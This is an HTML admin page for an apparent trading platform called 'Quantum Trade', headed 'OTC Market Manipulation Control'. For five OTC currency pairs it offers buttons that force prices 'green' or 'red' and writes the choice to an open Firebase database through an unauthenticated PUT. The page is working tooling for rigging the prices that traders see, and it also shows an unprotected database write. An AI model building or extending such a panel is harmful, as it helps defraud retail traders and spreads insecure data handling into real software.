<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quantum Trade - Master Admin Control</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-dark: #0b0e14;
            --panel-bg: #151a24;
            --border: #232a37;
            --green: #089981;
            --red: #f23645;
            --blue: #2962ff;
            --text: #f1f5f9;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }

        body {
            background: var(--bg-dark);
            color: var(--text);
            padding: 25px 15px;
            display: flex;
            justify-content: center;
        }

        .admin-card {
            width: 100%;
            max-width: 800px;
            background: var(--panel-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 15px;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--border);
        }

        .pair-row {
            background: rgba(255,255,255,0.02);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 12px 15px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }

        .pair-title { font-weight: 700; font-size: 14px; width: 140px; }

        .btn-group { display: flex; gap: 6px; }

        .btn-action {
            border: none;
            padding: 8px 12px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 11px;
            cursor: pointer;
            color: #fff;
            opacity: 0.4;
            transition: all 0.2s;
        }

        .btn-action.active { opacity: 1; transform: scale(1.05); }
        .btn-up { background: var(--green); }
        .btn-neutral { background: #475569; }
        .btn-down { background: var(--red); }

        .status-bar {
            text-align: center;
            font-size: 12px;
            color: var(--blue);
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="admin-card">
        <div class="header">
            <h2 style="color:var(--blue); font-size: 18px;"><i class="fa-solid fa-sliders"></i> OTC Market Manipulation Control</h2>
            <span style="font-size: 11px; color: #787b86;">Realtime Firebase Data Sync</span>
        </div>

        <div id="controlsList"></div>

        <div class="status-bar" id="syncStatus">
            <i class="fa-solid fa-signal"></i> Firebase Live Sync Active
        </div>
    </div>

    <script>
        const FIREBASE_URL = "https://reactions-maker-site-default-rtdb.firebaseio.com/pr.json";

        const pairs = [
            "USD/PKR (OTC)",
            "USD/INR (OTC)",
            "USD/BDT (OTC)",
            "USD/BRL (OTC)",
            "USD/ARS (OTC)"
        ];

        let controlData = {};

        window.addEventListener('DOMContentLoaded', async () => {
            await loadFirebaseData();
            renderAdminPanel();
        });

        async function loadFirebaseData() {
            try {
                const res = await fetch(FIREBASE_URL);
                if (res.ok) {
                    const data = await res.json();
                    if (data && data.controls) {
                        controlData = data.controls;
                    }
                }
            } catch (e) {
                console.error("Firebase fetch failed");
            }
        }

        function renderAdminPanel() {
            const list = document.getElementById('controlsList');
            list.innerHTML = "";

            pairs.forEach(pair => {
                const currentMode = (controlData[pair] && controlData[pair].mode) ? controlData[pair].mode : "NEUTRAL";

                const row = document.createElement('div');
                row.className = "pair-row";
                row.innerHTML = `
                    <div class="pair-title">${pair}</div>
                    <div class="btn-group">
                        <button class="btn-action btn-up ${currentMode === 'FORCE_UP' ? 'active' : ''}" onclick="updatePairMode('${pair}', 'FORCE_UP')">
                            <i class="fa-solid fa-arrow-up"></i> FORCE GREEN
                        </button>
                        <button class="btn-action btn-neutral ${currentMode === 'NEUTRAL' ? 'active' : ''}" onclick="updatePairMode('${pair}', 'NEUTRAL')">
                            <i class="fa-solid fa-equals"></i> NORMAL
                        </button>
                        <button class="btn-action btn-down ${currentMode === 'FORCE_DOWN' ? 'active' : ''}" onclick="updatePairMode('${pair}', 'FORCE_DOWN')">
                            <i class="fa-solid fa-arrow-down"></i> FORCE RED
                        </button>
                    </div>
                `;
                list.appendChild(row);
            });
        }

        async function updatePairMode(pair, mode) {
            if (!controlData[pair]) controlData[pair] = {};
            controlData[pair].mode = mode;

            renderAdminPanel();
            document.getElementById('syncStatus').innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Pushing Update to Firebase...`;

            try {
                await fetch(FIREBASE_URL, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ controls: controlData })
                });

                document.getElementById('syncStatus').innerHTML = `<i class="fa-solid fa-circle-check" style="color:var(--green)"></i> ${pair} updated to ${mode}`;
            } catch (e) {
                document.getElementById('syncStatus').innerHTML = `<i class="fa-solid fa-circle-exclamation" style="color:var(--red)"></i> Update Failed! Check Firebase connection.`;
            }
        }
    </script>
</body>
</html>
